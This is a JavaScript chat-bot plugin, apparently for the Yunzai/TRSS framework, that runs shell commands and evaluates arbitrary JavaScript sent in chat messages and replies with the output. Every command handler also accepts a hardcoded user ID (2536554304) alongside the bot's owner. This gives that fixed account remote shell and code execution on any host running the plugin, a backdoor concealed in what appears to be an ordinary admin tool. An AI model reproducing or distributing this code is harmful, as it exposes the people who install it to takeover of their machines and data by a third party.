import util from "node:util"
import puppeteer from "../../../lib/puppeteer/puppeteer.js"
import { AnsiUp } from "ansi_up"
const ansi_up = new AnsiUp

const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/`
const tplFile = `${htmlDir}Code.html`

export class RemoteCommand extends plugin {
  constructor() {
    super({
      name: "远程命令",
      dsc: "远程命令",
      event: "message",
      priority: 10,
      rule: [
        {
          reg: "^rcjp.+",
          fnc: "JSPic"
        },
        {
          reg: "^rcj.+",
          fnc: "JS"
        },
        {
          reg: "^rcp.+",
          fnc: "ShellPic"
        },
        {
          reg: "^rc.+",
          fnc: "Shell"
        },
        {
          reg: "^dm.+",
          fnc: "DirectMsg"
        },
        {
          reg: "^mm.+",
          fnc: "MultiMsg"
        },
        {
          reg: "^fm.+",
          fnc: "ForwardMsg"
        }
      ]
    })
  }

  async evalSync(cmd) {
    const ret = {}
    try {
      ret.raw = await eval(cmd)
      ret.stdout = Bot.String(ret.raw)
    } catch (err) {
      ret.stderr = Bot.String(err)
    }
    return ret
  }

  async JS(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    const cmd = this.e.msg.replace("rcj", "").trim()

    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
    const ret = await this.evalSync(cmd)
    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.stderr)}`)

    if (!ret.stdout && !ret.stderr)
      return this.reply("命令执行完成，没有返回值", true)
    if (ret.stdout)
      await this.reply(ret.stdout, true)
    if (ret.stderr)
      await this.reply(`错误输出：\n${ret.stderr}`, true)
  }

  async JSPic(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    const cmd = this.e.msg.replace("rcjp", "").trim()

    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
    const ret = await this.evalSync(cmd)
    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.stderr)}`)

    if (!ret.stdout && !ret.stderr)
      return this.reply("命令执行完成，没有返回值", true)

    if (ret.stdout) {
      const Code = await ansi_up.ansi_to_html(ret.stdout)
      const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(img, true)
    }

    if (ret.stderr) {
      const Code = await ansi_up.ansi_to_html(ret.stderr)
      const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(["错误输出：", img], true)
    }
  }

  async Shell(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    const cmd = this.e.msg.replace("rc", "").trim()
    const ret = await Bot.exec(cmd)

    if (!ret.stdout && !ret.stderr && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)
    if (ret.stdout)
      await this.reply(ret.stdout.trim(), true)
    if (ret.error)
      return this.reply(`远程命令错误：${ret.error.stack}`, true)
    if (ret.stderr)
      await this.reply(`标准错误输出：\n${ret.stderr.trim()}`, true)
  }

  async ShellPic(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    const cmd = this.e.msg.replace("rcp", "").trim()
    const ret = await Bot.exec(cmd)

    if (!ret.stdout && !ret.stderr && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)

    if (ret.stdout) {
      const Code = await ansi_up.ansi_to_html(ret.stdout.trim())
      const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(img, true)
    }

    if (ret.error) {
      const Code = await ansi_up.ansi_to_html(ret.error.stack.trim())
      const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      return this.reply(["远程命令错误：", img], true)
    }

    if (ret.stderr) {
      const Code = await ansi_up.ansi_to_html(ret.stderr.trim())
      const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(["标准错误输出：", img], true)
    }
  }

  async DirectMsg() {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    const ret = await this.evalSync(`(${this.e.msg.replace(/^#?[Dd][Mm]/, "")})`)
    if (ret.stderr)
      return this.reply(`错误输出：\n${ret.stderr}`, true)
    const m = []
    for (const i of Array.isArray(ret.raw) ? ret.raw : [ret.raw])
      if (typeof i != "object" || i.type) m.push(i)
      else m.push(segment.raw(i))
    return this.reply(m)
  }

  async MultiMsg() {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    const ret = await this.evalSync(`(${this.e.msg.replace(/^#?[Mm][Mm]/, "")})`)
    if (ret.stderr)
      return this.reply(`错误输出：\n${ret.stderr}`, true)
    const m = []
    for (const i of Array.isArray(ret.raw) ? ret.raw : [ret.raw])
      if (typeof i != "object" || i.type) m.push(i)
      else m.push(segment.raw(i))
    const r = []
    for (const i of m)
      r.push(await this.reply(i))
    return r
  }

  async ForwardMsg() {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    const ret = await this.evalSync(`(${this.e.msg.replace(/^#?[Ff][Mm]/, "")})`)
    if (ret.stderr)
      return this.reply(`错误输出：\n${ret.stderr}`, true)
    const m = []
    for (const a of Array.isArray(ret.raw) ? ret.raw : [ret.raw]) {
      const n = []
      for (const i of Array.isArray(a) ? a : [a])
        if (typeof i != "object" || i.type) n.push(i)
        else n.push(segment.raw(i))
      m.push(n)
    }
    return this.reply(await Bot.makeForwardArray(m))
  }
}